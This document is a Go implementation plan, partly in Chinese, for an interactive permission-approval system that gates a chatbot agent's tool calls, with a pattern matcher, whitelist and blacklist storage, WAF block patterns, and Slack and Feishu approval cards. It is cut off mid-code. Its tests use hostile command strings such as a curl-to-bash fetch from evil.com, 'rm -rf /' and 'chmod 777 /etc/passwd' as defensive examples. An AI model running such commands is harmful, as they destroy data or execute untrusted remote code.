# Interactive Permission UI - Implementation Plan

> **For agentic workers:** REQUIRED: Use superpowers:subagent-driven-development (if subagents available) or superpowers:executing-plans to implement this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 实现交互式权限卡片 UI，支持 Allow Once / Allow Always / Deny Once / Deny All 四种行为，结合 WAF Pattern 拦截和 CLI permission_denials 触发。

**Architecture:**
- 新增 `internal/permission/` 包：存储层 (types.go/store.go) + 匹配层 (matcher.go)
- 复用现有 `DangerApprovalRegistry` 模式（channel-based 等待），扩展为 `PermissionApprovalRegistry`
- 权限卡片基于现有 Slack Block Kit / Feishu Interactive Card 实现扩展
- 热更新：Allow Always 时调用 `engine.SetAllowedTools()` 立即生效

**Tech Stack:** Go 1.25 | Slack Block Kit | Feishu Interactive Card | JSON 文件存储

---

## Chunk 1: Core Data Model (`internal/permission/types.go`)

**Files:**
- Create: `internal/permission/types.go`
- Test: `internal/permission/types_test.go`

- [ ] **Step 1: Write the data structure test**

```go
package permission

import "testing"

func TestPattern_Match(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		tool    string
		input   string
		want    bool
	}{
		{"exact tool match", "Bash", "Bash", "echo hello", true},
		{"wildcard tool match", "Bash:rm.*-rf", "Bash", "rm -rf /tmp/test", true},
		{"no match wrong tool", "Edit", "Bash", "rm -rf /tmp", false},
		{"no match wrong cmd", "Bash:rm.*-rf", "Bash", "echo hello", false},
		{"regex special chars", "Bash:curl.*\\|.*bash", "Bash", "curl http://evil.com | bash", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := Pattern{Value: tt.pattern}
			if got := p.Match(tt.tool, tt.input); got != tt.want {
				t.Errorf("Pattern.Match() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestDecision_String(t *testing.T) {
	if DecisionAllow.String() != "allow" {
		t.Errorf("DecisionAllow = %v, want allow", DecisionAllow.String())
	}
	if DecisionDeny.String() != "deny" {
		t.Errorf("DecisionDeny = %v, want deny", DecisionDeny.String())
	}
	if DecisionBlocked.String() != "blocked" {
		t.Errorf("DecisionBlocked = %v, want blocked", DecisionBlocked.String())
	}
	if DecisionUnknown.String() != "unknown" {
		t.Errorf("DecisionUnknown = %v, want unknown", DecisionUnknown.String())
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/permission/... -v`
Expected: FAIL — package does not exist

- [ ] **Step 3: Write the types**

```go
package permission

import (
	"regexp"
	"strings"
	"time"
)

// Decision represents the result of a permission check.
type Decision int

const (
	DecisionAllow Decision = iota
	DecisionDeny
	DecisionBlocked
	DecisionUnknown
)

func (d Decision) String() string {
	switch d {
	case DecisionAllow:
		return "allow"
	case DecisionDeny:
		return "deny"
	case DecisionBlocked:
		return "blocked"
	default:
		return "unknown"
	}
}

// PatternEntry represents a permission pattern with metadata.
type PatternEntry struct {
	Pattern   string    `json:"pattern"`
	CreatedAt time.Time `json:"created_at"`
	CreatedBy string    `json:"created_by"`
}

// PermissionsFile represents the on-disk JSON structure.
type PermissionsFile struct {
	BotID      string         `json:"bot_id"`
	Whitelist []PatternEntry `json:"whitelist,omitempty"`
	Blacklist []PatternEntry `json:"blacklist,omitempty"`
}

// Pattern parses and matches a permission pattern.
// Format: {ToolName}:{CommandRegex}
// If no ":" is present, matches any command for the tool.
type Pattern struct {
	Value string
}

var toolCommandSplit = regexp.MustCompile(`:(.+)`)

// Match returns true if the pattern matches the given tool name and input.
func (p Pattern) Match(tool, input string) bool {
	if p.Value == "" {
		return false
	}

	matches := toolCommandSplit.FindStringSubmatch(p.Value)
	if len(matches) == 2 {
		// Format: ToolName:CommandRegex
		toolName := strings.TrimSuffix(p.Value, ":"+matches[1])
		if !strings.EqualFold(tool, toolName) {
			return false
		}
		re, err := regexp.Compile(matches[1])
		if err != nil {
			return false
		}
		return re.MatchString(input)
	}

	// No ":" — match any command for this tool
	return strings.EqualFold(tool, p.Value)
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `go test ./internal/permission/... -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/permission/types.go internal/permission/types_test.go
git commit -m "feat(permission): add core data types and Pattern matcher"
```

---

## Chunk 2: PermissionStore (`internal/permission/store.go`)

**Files:**
- Create: `internal/permission/store.go`
- Create: `internal/permission/store_test.go`
- Modify: `chatapps/manager.go` (add PermissionStore interface)

- [ ] **Step 1: Write the store interface and file-based implementation test**

```go
package permission

import (
	"os"
	"path/filepath"
	"testing"
)

func TestFilePermissionStore_SaveLoad(t *testing.T) {
	dir := t.TempDir()
	store := NewFilePermissionStore(dir)

	botID := "U0AHRCL1KCM"
	err := store.Load(botID)
	if err != nil {
		t.Fatalf("Load() error = %v", err)
	}

	// Add whitelist entry
	err = store.AddWhitelist(botID, "Bash:rm.*-rf", "user1")
	if err != nil {
		t.Fatalf("AddWhitelist() error = %v", err)
	}

	// Save
	err = store.Save(botID)
	if err != nil {
		t.Fatalf("Save() error = %v", err)
	}

	// Reload
	store2 := NewFilePermissionStore(dir)
	err = store2.Load(botID)
	if err != nil {
		t.Fatalf("Reload Load() error = %v", err)
	}

	wl := store2.GetWhitelist(botID)
	if len(wl) != 1 || wl[0] != "Bash:rm.*-rf" {
		t.Errorf("GetWhitelist() = %v, want [Bash:rm.*-rf]", wl)
	}
}

func TestFilePermissionStore_AddRemove(t *testing.T) {
	dir := t.TempDir()
	store := NewFilePermissionStore(dir)
	botID := "TESTBOT"

	_ = store.Load(botID)

	err := store.AddWhitelist(botID, "Bash:rm.*-rf", "user1")
	if err != nil {
		t.Fatalf("AddWhitelist() error = %v", err)
	}

	wl := store.GetWhitelist(botID)
	if len(wl) != 1 {
		t.Fatalf("expected 1 whitelist entry, got %d", len(wl))
	}

	err = store.RemoveWhitelist(botID, "Bash:rm.*-rf")
	if err != nil {
		t.Fatalf("RemoveWhitelist() error = %v", err)
	}

	wl = store.GetWhitelist(botID)
	if len(wl) != 0 {
		t.Errorf("expected 0 whitelist entries after remove, got %d", len(wl))
	}

	// Blacklist
	err = store.AddBlacklist(botID, "Bash:chmod 777", "user1")
	if err != nil {
		t.Fatalf("AddBlacklist() error = %v", err)
	}
	bl := store.GetBlacklist(botID)
	if len(bl) != 1 {
		t.Errorf("expected 1 blacklist entry, got %d", len(bl))
	}
}

func TestFilePermissionStore_IsAllowed(t *testing.T) {
	dir := t.TempDir()
	store := NewFilePermissionStore(dir)
	botID := "TESTBOT"

	_ = store.Load(botID)
	_ = store.AddWhitelist(botID, "Bash:rm.*-rf", "user1")
	_ = store.AddBlacklist(botID, "Bash:chmod 777", "user1")

	// Whitelist match
	allowed, why := store.IsAllowed(botID, "Bash", "rm -rf /tmp/test")
	if !allowed || why != "whitelist" {
		t.Errorf("IsAllowed(whitelist) = (%v, %q), want (true, whitelist)", allowed, why)
	}

	// Blacklist match
	allowed, why = store.IsAllowed(botID, "Bash", "chmod 777 /etc/passwd")
	if allowed || why != "blacklist" {
		t.Errorf("IsAllowed(blacklist) = (%v, %q), want (false, blacklist)", allowed, why)
	}

	// No match
	allowed, why = store.IsAllowed(botID, "Bash", "echo hello")
	if allowed || why != "" {
		t.Errorf("IsAllowed(nomatch) = (%v, %q), want (false, \"\")", allowed, why)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/permission/... -v`
Expected: FAIL — store.go does not exist

- [ ] **Step 3: Write the store implementation**

```go
package permission

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"
)

// PermissionStore manages permission patterns for a bot.
type PermissionStore interface {
	// Load reads persisted patterns from disk.
	Load(botID string) error
	// Save persists patterns to disk.
	Save(botID string) error

	// Pattern management
	AddWhitelist(botID, pattern, createdBy string) error
	RemoveWhitelist(botID, pattern string) error
	AddBlacklist(botID, pattern, createdBy string) error
	RemoveBlacklist(botID, pattern string) error

	// Queries
	GetWhitelist(botID) []string
	GetBlacklist(botID) []string
	// IsAllowed returns (allowed, reason).
	// reason is "whitelist", "blacklist", or "".
	IsAllowed(botID, tool, input string) (bool, string)
}

// FilePermissionStore implements PermissionStore with memory + JSON file.
type FilePermissionStore struct {
	baseDir string
	mu      sync.RWMutex
	data    map[string]*PermissionsFile // botID → data
}

var _ PermissionStore = (*FilePermissionStore)(nil)

// NewFilePermissionStore creates a store with the given base directory.
// Stores files at: {baseDir}/{botID}/permissions.json
func NewFilePermissionStore(baseDir string) *FilePermissionStore {
	return &FilePermissionStore{
		baseDir: baseDir,
		data:    make(map[string]*PermissionsFile),
	}
}

// Load reads the permissions file for the given botID.
func (s *FilePermissionStore) Load(botID string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if _, ok := s.data[botID]; ok {
		return nil // already loaded
	}

	path := s.filePath(botID)
	f, err := os.ReadFile(path)
	if os.IsNotExist(err) {
		s.data[botID] = &PermissionsFile{BotID: botID}
		return nil
	}
	if err != nil {
		return fmt.Errorf("read permissions file: %w", err)
	}

	var pf PermissionsFile
	if err := json.Unmarshal(f, &pf); err != nil {
		return fmt.Errorf("parse permissions file: %w", err)
	}
	s.data[botID] = &pf
	return nil
}

// Save persists the permissions file for the given botID.
func (s *FilePermissionStore) Save(botID string) error {
	s.mu.Lock()
	pf, ok := s.data[botID]
	if !ok {
		s.mu.Unlock()
		return fmt.Errorf("botID %q not loaded", botID)
	}
	// Deep-copy under write lock to avoid data races during marshal.
	// Using Lock (not RLock) because AddWhitelist/AddBlacklist hold Lock.
	pfCopy := &PermissionsFile{
		BotID:      pf.BotID,
		Whitelist:  append([]PatternEntry{}, pf.Whitelist...),
		Blacklist:  append([]PatternEntry{}, pf.Blacklist...),
	}
	s.mu.Unlock()

	data, err := json.MarshalIndent(pfCopy, "", "  ")
	if err != nil {
		return fmt.Errorf("marshal permissions: %w", err)
	}

	dir := filepath.Join(s.baseDir, botID)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("create bot dir: %w", err)
	}

	path := s.filePath(botID)
	if err := os.WriteFile(path, data, 0600); err != nil {
		return fmt.Errorf("write permissions file: %w", err)
	}
	return nil
}

func (s *FilePermissionStore) filePath(botID string) string {
	return filepath.Join(s.baseDir, botID, "permissions.json")
}

// AddWhitelist adds a pattern to the whitelist.
func (s *FilePermissionStore) AddWhitelist(botID, pattern, createdBy string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	pf := s.getOrCreate(botID)
	// Check for duplicates
	for _, e := range pf.Whitelist {
		if e.Pattern == pattern {
			return nil
		}
	}
	pf.Whitelist = append(pf.Whitelist, PatternEntry{
		Pattern:   pattern,
		CreatedAt: time.Now().UTC(),
		CreatedBy: createdBy,
	})
	return nil
}

// RemoveWhitelist removes a pattern from the whitelist.
func (s *FilePermissionStore) RemoveWhitelist(botID, pattern string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	pf, ok := s.data[botID]
	if !ok {
		return nil
	}
	filtered := make([]PatternEntry, 0, len(pf.Whitelist))
	for _, e := range pf.Whitelist {
		if e.Pattern != pattern {
			filtered = append(filtered, e)
		}
	}
	pf.Whitelist = filtered
	return nil
}

// AddBlacklist adds a pattern to the blacklist.
func (s *FilePermissionStore) AddBlacklist(botID, pattern, createdBy string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	pf := s.getOrCreate(botID)
	for _, e := range pf.Blacklist {
		if e.Pattern == pattern {
			return nil
		}
	}
	pf.Blacklist = append(pf.Blacklist, PatternEntry{
		Pattern:   pattern,
		CreatedAt: time.Now().UTC(),
		CreatedBy: createdBy,
	})
	return nil
}

// RemoveBlacklist removes a pattern from the blacklist.
func (s *FilePermissionStore) RemoveBlacklist(botID, pattern string) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	pf, ok := s.data[botID]
	if !ok {
		return nil
	}
	filtered := make([]PatternEntry, 0, len(pf.Blacklist))
	for _, e := range pf.Blacklist {
		if e.Pattern != pattern {
			filtered = append(filtered, e)
		}
	}
	pf.Blacklist = filtered
	return nil
}

// GetWhitelist returns all whitelist patterns for the bot.
func (s *FilePermissionStore) GetWhitelist(botID string) []string {
	s.mu.RLock()
	defer s.mu.RUnlock()

	pf, ok := s.data[botID]
	if !ok {
		return nil
	}
	patterns := make([]string, len(pf.Whitelist))
	for i, e := range pf.Whitelist {
		patterns[i] = e.Pattern
	}
	return patterns
}

// GetBlacklist returns all blacklist patterns for the bot.
func (s *FilePermissionStore) GetBlacklist(botID string) []string {
	s.mu.RLock()
	defer s.mu.RUnlock()

	pf, ok := s.data[botID]
	if !ok {
		return nil
	}
	patterns := make([]string, len(pf.Blacklist))
	for i, e := range pf.Blacklist {
		patterns[i] = e.Pattern
	}
	return patterns
}

// IsAllowed checks whitelist first, then blacklist.
func (s *FilePermissionStore) IsAllowed(botID, tool, input string) (bool, string) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	pf, ok := s.data[botID]
	if !ok {
		return false, ""
	}

	// Check whitelist (allow takes precedence)
	for _, e := range pf.Whitelist {
		if Pattern{Value: e.Pattern}.Match(tool, input) {
			return true, "whitelist"
		}
	}

	// Check blacklist
	for _, e := range pf.Blacklist {
		if Pattern{Value: e.Pattern}.Match(tool, input) {
			return false, "blacklist"
		}
	}

	return false, ""
}

func (s *FilePermissionStore) getOrCreate(botID string) *PermissionsFile {
	if pf, ok := s.data[botID]; ok {
		return pf
	}
	pf := &PermissionsFile{BotID: botID}
	s.data[botID] = pf
	return pf
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/permission/... -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/permission/store.go internal/permission/store_test.go
git commit -m "feat(permission): add FilePermissionStore with memory+JSON persistence"
```

---

## Chunk 3: PermissionMatcher (`internal/permission/matcher.go`)

**Files:**
- Create: `internal/permission/matcher.go`
- Create: `internal/permission/matcher_test.go`

- [ ] **Step 1: Write the matcher test**

```go
package permission

import "testing"

func TestPermissionMatcher_Check(t *testing.T) {
	dir := t.TempDir()
	m := NewPermissionMatcher(dir)

	botID := "TESTBOT"

	// Initially unknown
	if d := m.Check(botID, "Bash", "rm -rf /"); d != DecisionUnknown {
		t.Errorf("Check() = %v, want DecisionUnknown", d)
	}

	// Add whitelist
	_ = m.AddWhitelist(botID, "Bash:rm", "user1")
	if d := m.Check(botID, "Bash", "rm /tmp/test"); d != DecisionAllow {
		t.Errorf("Check(whitelist) = %v, want DecisionAllow", d)
	}

	// Add blacklist
	_ = m.AddBlacklist(botID, "Bash:rm.*-rf", "user1")
	if d := m.Check(botID, "Bash", "rm -rf /"); d != DecisionDeny {
		t.Errorf("Check(blacklist) = %v, want DecisionDeny", d)
	}

	// Whitelist overrides blacklist for non-matching pattern
	if d := m.Check(botID, "Bash", "rm /tmp"); d != DecisionAllow {
		t.Errorf("Check(whitelist override) = %v, want DecisionAllow", d)
	}

	// No match = unknown
	if d := m.Check(botID, "Edit", "echo hello"); d != DecisionUnknown {
		t.Errorf("Check(nomatch) = %v, want DecisionUnknown", d)
	}
}

func TestPermissionMatcher_WAFPattern(t *testing.T) {
	dir := t.TempDir()
	m := NewPermissionMatcher(dir)
	m.AddWAFPatterns([]string{"Bash:rm.*-rf", "Bash:wget.*"})

	// WAF hit = blocked
	if d := m.Check("anybot", "Bash", "rm -rf /"); d != DecisionBlocked {
		t.Errorf("Check(WAF hit) = %v, want DecisionBlocked", d)
	}

	// WAF miss = unknown
	if d := m.Check("anybot", "Bash", "echo hello"); d != DecisionUnknown {
		t.Errorf("Check(WAF miss) = %v, want DecisionUnknown", d)
	}
}

func TestPermissionMatcher_HotReload(t *testing.T) {
	dir := t.TempDir()
	m := NewPermissionMatcher(dir)
	botID := "TESTBOT"

	// Add whitelist
	_ = m.AddWhitelist(botID, "Bash:echo.*hello", "user1")

	// New instance loads persisted data
	m2 := NewPermissionMatcher(dir)
	_ = m2.Load(botID)
	if d := m2.Check(botID, "Bash", "echo hello world"); d != DecisionAllow {
		t.Errorf("Check after reload = %v, want DecisionAllow", d)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/permission/... -v`
Expected: FAIL — matcher.go does not exist

- [ ] **Step 3: Write the matcher**

```go
package permission

import (
	"sync"
)

// PermissionMatcher coordinates WAF patterns and per-bot stores.
type PermissionMatcher struct {
	wafPatterns []Pattern
	stores      sync.Map // botID → *FilePermissionStore
	baseDir     string
}

var _ PermissionStore = (*PermissionMatcher)(nil)

// NewPermissionMatcher creates a matcher with the given base directory.
func NewPermissionMatcher(baseDir string) *PermissionMatcher {
	return &PermissionMatcher{
		baseDir: baseDir,
	}
}

// AddWAFPatterns adds WAF patterns that trigger DecisionBlocked.
// These patterns are global (not bot-specific).
func (m *PermissionMatcher) AddWAFPatterns(patterns []string) {
	for _, p := range patterns {
		m.wafPatterns = append(m.wafPatterns, Pattern{Value: p})
	}
}

// Check returns the permission decision for a tool+input.
// Order: WAF → whitelist → blacklist → unknown
func (m *PermissionMatcher) Check(botID, tool, input string) Decision {
	// 1. WAF check
	for _, p := range m.wafPatterns {
		if p.Match(tool, input) {
			return DecisionBlocked
		}
	}

	// 2. Bot-level store
	store := m.getStore(botID)
	if store == nil {
		return DecisionUnknown
	}

	allowed, why := store.IsAllowed(botID, tool, input)
	if why == "whitelist" {
		return DecisionAllow
	}
	if why == "blacklist" {
		return DecisionDeny
	}
	_ = allowed
	return DecisionUnknown
}

// getStore returns or creates the store for a botID.
func (m *PermissionMatcher) getStore(botID string) *FilePermissionStore {
	if val, ok := m.stores.Load(botID); ok {
		return val.(*FilePermissionStore)
	}

	store := NewFilePermissionStore(m.baseDir)
	if err := store.Load(botID); err != nil {
		return nil
	}
	m.stores.Store(botID, store)
	return store
}

// Load loads the store for a bot.
func (m *PermissionMatcher) Load(botID string) error {
	store := m.getStore(botID)
	if store == nil {
		return nil
	}
	return store.Load(botID)
}

// Save saves the store for a bot.
func (m *PermissionMatcher) Save(botID string) error {
	store := m.getStore(botID)
	if store == nil {
		return nil
	}
	return store.Save(botID)
}

// AddWhitelist delegates to the bot store.
func (m *PermissionMatcher) AddWhitelist(botID, pattern, createdBy string) error {
	store := m.getStore(botID)
	if store == nil {
		return nil
	}
	if err := store.AddWhitelist(botID, pattern, createdBy); err != nil {
		return err
	}
	return store.Save(botID)
}

// RemoveWhitelist delegates to the bot store.
func (m *PermissionMatcher) RemoveWhitelist(botID, pattern string) error {
	store := m.getStore(botID)
	if store == nil {
		return nil
	}
	if err := store.RemoveWhitelist(botID, pattern); err != nil {
		return err
	}
	return store.Save(botID)
}

// AddBlacklist delegates to the bot store.
func (m *PermissionMatcher) AddBlacklist(botID, pattern, createdBy string) error {
	store := m.getStore(botID)
	if store == nil {
		return nil
	}
	if err := store.AddBlacklist(botID, pattern, createdBy); err != nil {
		return err
	}
	return store.Save(botID)
}

// RemoveBlacklist delegates to the bot store.
func (m *PermissionMatcher) RemoveBlacklist(botID, pattern string) error {
	store := m.getStore(botID)
	if store == nil {
		return nil
	}
	if err := store.RemoveBlacklist(botID, pattern); err != nil {
		return err
	}
	return store.Save(botID)
}

// GetWhitelist delegates to the bot store.
func (m *PermissionMatcher) GetWhitelist(botID string) []string {
	store := m.getStore(botID)
	if store == nil {
		return nil
	}
	return store.GetWhitelist(botID)
}

// GetBlacklist delegates to the bot store.
func (m *PermissionMatcher) GetBlacklist(botID string) []string {
	store := m.getStore(botID)
	if store == nil {
		return nil
	}
	return store.GetBlacklist(botID)
}

// IsAllowed implements PermissionStore.
func (m *PermissionMatcher) IsAllowed(botID, tool, input string) (bool, string) {
	store := m.getStore(botID)
	if store == nil {
		return false, ""
	}
	return store.IsAllowed(botID, tool, input)
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/permission/... -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/permission/matcher.go internal/permission/matcher_test.go
git commit -m "feat(permission): add PermissionMatcher with WAF + layered matching"
```

---

## Chunk 4: Slack Permission Card (`chatapps/slack/permission_card.go`)

**Files:**
- Create: `chatapps/slack/permission_card.go`
- Test: `chatapps/slack/permission_card_test.go`

- [ ] **Step 1: Write the Slack permission card test**

```go
package slack

import (
	"encoding/json"
	"testing"
)

func TestBuildPermissionCardBlocks(t *testing.T) {
	blocks := BuildPermissionCardBlocks(
		"U0AHRCL1KCM",
		"abc123",
		"msg456",
		"Bash",
		"rm -rf /tmp/test",
		"abc123",
	)

	if len(blocks) == 0 {
		t.Fatal("expected non-empty blocks")
	}

	// Verify it's valid Slack blocks JSON
	data, err := json.Marshal(blocks)
	if err != nil {
		t.Fatalf("Marshal blocks failed: %v", err)
	}
	if len(data) == 0 {
		t.Fatal("expected non-empty JSON")
	}
}

func TestBuildPermissionResultBlocks(t *testing.T) {
	blocks := BuildPermissionResultBlocks("allow", "Bash", "rm -rf /tmp/test")
	if len(blocks) == 0 {
		t.Fatal("expected non-empty result blocks")
	}
}

func TestActionIDFormat(t *testing.T) {
	// Test the action ID format matches what handlePermissionCallback expects
	// Format: perm_{action}:{sessionID}:{messageID}
	sessionID := "sess_abc"
	msgID := "msg_123"
	action := "allow_always"

	expected := "perm_allow_always:sess_abc:msg_123"
	got := MakePermissionActionID(action, sessionID, msgID)
	if got != expected {
		t.Errorf("MakePermissionActionID = %q, want %q", got, expected)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./chatapps/slack/... -run TestBuildPermission -v`
Expected: FAIL — permission_card.go does not exist

- [ ] **Step 3: Write the Slack permission card**

```go
package slack

import (
	"fmt"
	"strings"

	"github.com/slack-go/slack"
)

// BuildPermissionCardBlocks builds Slack blocks for a permission request card.
// ActionID format: perm_{action}:{sessionID}:{messageID}
// Tool+command context is stored in GlobalPermissionContext for callback retrieval.
func BuildPermissionCardBlocks(botID, sessionID, msgID, tool, command, userID string) []slack.Block {
	headerText := slack.NewTextBlockObject(
		slack.PlainTextType,
		"\U0001F6A8 权限请求",
		false, false,
	)
	header := slack.NewHeaderBlock(headerText)

	toolText := slack.NewTextBlockObject(slack.MarkdownType, fmt.Sprintf("*工具:* `%s`", tool), false, false)
	cmdText := slack.NewTextBlockObject(slack.MarkdownType, fmt.Sprintf("*命令:* ```%s```", command), false, false)
	sessionText := slack.NewTextBlockObject(slack.MarkdownType, fmt.Sprintf("*Session:* `%s`", sessionID), false, false)

	section := slack.NewSectionBlock(
		nil,
		[]*slack.TextBlockObject{toolText, cmdText, sessionText},
		nil,
	)

	divider := slack.NewDividerBlock()

	// Store pending tool+command in memory so callback can retrieve it.
	// Pattern key: "actionID -> tool:command"
	allowOnceID := MakePermissionActionID("allow_once", sessionID, msgID)
	allowAlwaysID := MakePermissionActionID("allow_always", sessionID, msgID)
	denyOnceID := MakePermissionActionID("deny_once", sessionID, msgID)
	denyAllID := MakePermissionActionID("deny_all", sessionID, msgID)

	base.GlobalPermissionContext.Store(allowOnceID, fmt.Sprintf("%s:%s", tool, command))
	base.GlobalPermissionContext.Store(allowAlwaysID, fmt.Sprintf("%s:%s", tool, command))
	base.GlobalPermissionContext.Store(denyOnceID, fmt.Sprintf("%s:%s", tool, command))
	base.GlobalPermissionContext.Store(denyAllID, fmt.Sprintf("%s:%s", tool, command))

	allowOnce := slack.NewButtonBlockElement(
		allowOnceID,
		"allow_once",
		slack.NewTextBlockObject(slack.PlainTextType, "\u2705 Allow Once", false, false),
	)
	allowAlways := slack.NewButtonBlockElement(
		allowAlwaysID,
		"allow_always",
		slack.NewTextBlockObject(slack.PlainTextType, "\U0001F512 Allow Always", false, false),
	)
	denyOnce := slack.NewButtonBlockElement(
		denyOnceID,
		"deny_once",
		slack.NewTextBlockObject(slack.PlainTextType, "\U0001F6AB Deny Once", false, false),
	)
	denyAll := slack.NewButtonBlockElement(
		denyAllID,
		"deny_all",
		slack.NewTextBlockObject(slack.PlainTextType, "\u26D4 Deny All", false, false),
	)

	return []slack.Block{header, section, divider,
		slack.NewActionBlock("permission_actions", allowOnce, allowAlways, denyOnce, denyAll),
	}
}

// BuildPermissionResultBlocks builds the result card (updated after user decision).
func BuildPermissionResultBlocks(decision, tool, command string) []slack.Block {
	var emoji, title, description string
	switch decision {
	case "allow", "allow_once":
		emoji = "\u2705"
		title = "已允许（本次）"
		description = fmt.Sprintf("工具 `%s` 的本次执行已被允许。", tool)
	case "allow_always":
		emoji = "\U0001F512"
		title = "已永久允许"
		description = fmt.Sprintf("`%s` 已被添加到白名单，后续无需审批。", tool)
	case "deny", "deny_once":
		emoji = "\U0001F6AB"
		title = "已拒绝（本次）"
		description = fmt.Sprintf("工具 `%s` 的本次执行已被拒绝。", tool)
	case "deny_all":
		emoji = "\u26D4"
		title = "已永久拒绝"
		description = fmt.Sprintf("`%s` 已被添加到黑名单，后续请求将被自动拦截。", tool)
	default:
		emoji = "\u23F3"
		title = "已取消"
		description = "操作已取消。"
	}

	headerText := slack.NewTextBlockObject(
		slack.PlainTextType,
		fmt.Sprintf("%s %s", emoji, title),
		false, false,
	)
	header := slack.NewHeaderBlock(headerText)

	descText := slack.NewTextBlockObject(
		slack.MarkdownType,
		fmt.Sprintf("%s\n\n*命令:* ```%s```", description, command),
		false, false,
	)
	section := slack.NewSectionBlock(nil, []*slack.TextBlockObject{descText}, nil)

	return []slack.Block{header, section}
}

// BuildPermissionDeniedCard builds a read-only card for CLI permission_denials.
func BuildPermissionDeniedCard(tool, command, reason string) []slack.Block {
	headerText := slack.NewTextBlockObject(
		slack.PlainTextType,
		"\u26A0\uFE0F 权限被拒绝（CLI）",
		false, false,
	)
	header := slack.NewHeaderBlock(headerText)

	toolText := slack.NewTextBlockObject(slack.MarkdownType, fmt.Sprintf("*工具:* `%s`", tool), false, false)
	cmdText := slack.NewTextBlockObject(slack.MarkdownType, fmt.Sprintf("*命令:* ```%s```", command), false, false)
	reasonText := slack.NewTextBlockObject(slack.MarkdownType, fmt.Sprintf("*原因:* %s\n\n请联系管理员调整权限配置。", reason), false, false)

	section := slack.NewSectionBlock(
		nil,
		[]*slack.TextBlockObject{toolText, cmdText, reasonText},
		nil,
	)

	return []slack.Block{header, section}
}

// MakePermissionActionID constructs the action ID for permission buttons.
// Format: perm_{action}:{sessionID}:{messageID}
func MakePermissionActionID(action, sessionID, msgID string) string {
	return fmt.Sprintf("perm_%s:%s:%s", action, sessionID, msgID)
}

// ParsePermissionActionID parses the action ID back into components.
func ParsePermissionActionID(actionID string) (action, sessionID, msgID string, ok bool) {
	parts := strings.Split(actionID, ":")
	if len(parts) != 3 {
		return "", "", "", false
	}
	return parts[0], parts[1], parts[2], true
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./chatapps/slack/... -run TestBuildPermission -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add chatapps/slack/permission_card.go chatapps/slack/permission_card_test.go
git commit -m "feat(permission): add Slack permission card builders"
```

---

## Chunk 5: Feishu Permission Card (`chatapps/feishu/permission_card.go`)

**Files:**
- Create: `chatapps/feishu/permission_card.go`
- Modify: `chatapps/feishu/interactive_handler.go` (update action routing)

- [ ] **Step 1: Write the Feishu permission card**

```go
package feishu

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/hrygo/hotplex/chatapps/base"
)

// ActionValueWithContext extends ActionValue with tool+command for permission cards.
type ActionValueWithContext struct {
	Action    string `json:"action"`
	SessionID string `json:"session_id"`
	MessageID string `json:"message_id,omitempty"`
	Tool      string `json:"tool"`
	Command   string `json:"command"`
}

// EncodeActionValueWithContext encodes an action value with tool+command context for persistence.
func EncodeActionValueWithContext(action, sessionID, msgID, tool, command string) (string, error) {
	value := ActionValueWithContext{
		Action:    action,
		SessionID: sessionID,
		MessageID: msgID,
		Tool:      tool,
		Command:   command,
	}
	data, err := json.Marshal(value)
	if err != nil {
		return "", err
	}
	// Note: For Feishu, the tool+command is carried in the JSON payload itself,
	// so DecodeActionValueWithContext can extract it directly without GlobalPermissionContext.
	// No StorePermissionContext call needed for Feishu.
	return string(data), nil
}

// DecodeActionValueWithContext decodes an action value with context.
func DecodeActionValueWithContext(value string) (*ActionValueWithContext, error) {
	var av ActionValueWithContext
	if err := json.Unmarshal([]byte(value), &av); err != nil {
		return nil, err
	}
	return &av, nil
}

// BuildPermissionCard builds a Feishu interactive card for permission request.
// Uses base.PermissionCardData (shared with Slack). Tool+command context is embedded
// in the button value JSON so the callback can retrieve it without GlobalPermissionContext.
func BuildPermissionCard(data base.PermissionCardData) *CardTemplate {
	// Encode action with tool+command context for persistence lookup
	allowOnceValue, _ := EncodeActionValueWithContext("perm_allow_once", data.SessionID, data.MessageID, data.Tool, data.Command)
	allowAlwaysValue, _ := EncodeActionValueWithContext("perm_allow_always", data.SessionID, data.MessageID, data.Tool, data.Command)
	denyOnceValue, _ := EncodeActionValueWithContext("perm_deny_once", data.SessionID, data.MessageID, data.Tool, data.Command)
	denyAllValue, _ := EncodeActionValueWithContext("perm_deny_all", data.SessionID, data.MessageID, data.Tool, data.Command)

	return &CardTemplate{
		Config: &CardConfig{
			WideScreenMode: false,
			EnableForward:  true,
		},
		Header: &CardHeader{
			Template: CardTemplateOrange,
			Title: &Text{
				Content: "\U0001F6A8 权限请求",
				Tag:     TextTypePlainText,
			},
		},
		Elements: []CardElement{
			{
				Type: ElementDiv,
				Text: &Text{
					Content: fmt.Sprintf("**工具:** `%s`\n\n**命令:**\n```%s```\n\n**Session:** `%s`", data.Tool, data.Command, data.SessionID),
					Tag: TextTypeLarkMD,
				},
			},
			// Divider: plain text line (ElementHr does not exist in feishu card constants)
			{
				Type: ElementDiv,
				Text: &Text{
					Content: "─────────────────",
					Tag:    TextTypePlainText,
				},
			},
			{
				Type: ElementNote,
				Elements: []CardElement{
					{
						Type: ElementMarkdown,
						Text: &Text{
